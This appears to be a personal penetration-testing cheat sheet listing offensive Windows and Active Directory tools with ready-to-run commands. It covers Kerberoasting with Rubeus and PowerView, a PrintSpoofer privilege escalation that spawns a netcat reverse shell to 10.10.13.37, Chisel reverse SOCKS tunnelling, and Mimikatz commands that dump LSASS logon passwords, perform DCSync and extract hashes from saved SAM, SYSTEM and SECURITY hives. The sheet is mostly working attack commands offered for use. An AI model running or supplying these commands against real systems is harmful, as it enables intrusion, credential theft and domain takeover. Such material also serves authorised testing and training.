# tools
***
### Inveigh.ps1
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
Similar to Responder, for powershell 
PS C:\> Import-Module .\Inveigh.ps1 
PS C:\> (Get-Command Invoke-Inveigh).Parameters
PS C:\> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y


### PowerView.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Replacements for various Windows net*
PS C:\> import-module .\PowerView.ps1
PS C:\> Get-DomainPolicy
PS C:\> Get-DomainUser * -spn | select samaccountname  #to extract TGS tickets
PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\all_tickets.csv -NoTypeInformation  #export to csv


### nc.exe
https://github.com/int0x33/nc.exe/
netcat Win binary, for port listening and reverse shell 


### printspoofer
To escalate with SeImpersonatePrivilege & SeAssignPrimaryTokenPrivilege
PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"


### Rubeus
https://github.com/GhostPack/Rubeus
Kerberoasting from windows machine
PS C:\> .\Rubeus.exe kerberoast /stats  #to gather some stats
PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  #/nowrap to copy hash easily
PS C:\> .\Rubeus.exe kerberoast /user:"username" /nowrap  #to test spesific user
PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap  #RC4 encryption when requesting a new service ticket


### SharpHound.exe
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
To gather AD data for Bloodhound


### Snaffler.exe
https://github.com/SnaffCon/Snaffler
Credential Enumeration
PS C:\> .\Snaffler.exe  -d <DomainName> -s -v data
  

### Chisel
https://github.com/jpillora/chisel
Pre-compiled Chisel for port-forwarding, both linux and windows
sudo ./chisel server --reverse -v -p 1234 --socks5
./chisel.exe client -v <YourIP>:1234 R:socks
  

### Lazagne
https://github.com/AlessandroZ/LaZagne
checks for passwords in common locations

  
### Linpeas / Winpeas
Checks for possible priv esc for linux and windows
  
  
### Mimikatz
https://github.com/ParrotSec/mimikatz
  
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

#use lsass.DMP and put results to lsass.txt
#lsass.DMP can be acquired with right click lsass.exe and create dump method from task manager in details
mimikatz # sekurlsa::minidump lsass.DMP
mimikatz # log lsass.txt
mimikatz # sekurlsa::logonPasswords

#for dcsync abuse
mimikatz # lsadump::dcsync
mimikatz # lsadump::dcsync /user:<UserName>  #for spesific user only 


reg save HKLM\SAM sam.h  #to Dump SAM
reg save HKLM\SYSTEM sys.h  #to Dump SYSTEM
reg save HKLM\SECURITY sec.h  #to Dump SECURITY
mimikatz # lsadump::sam sys.h sam.h sec.h  #get hashes from these files with mimikatz

  
  
  
  
  
  
  
  
  










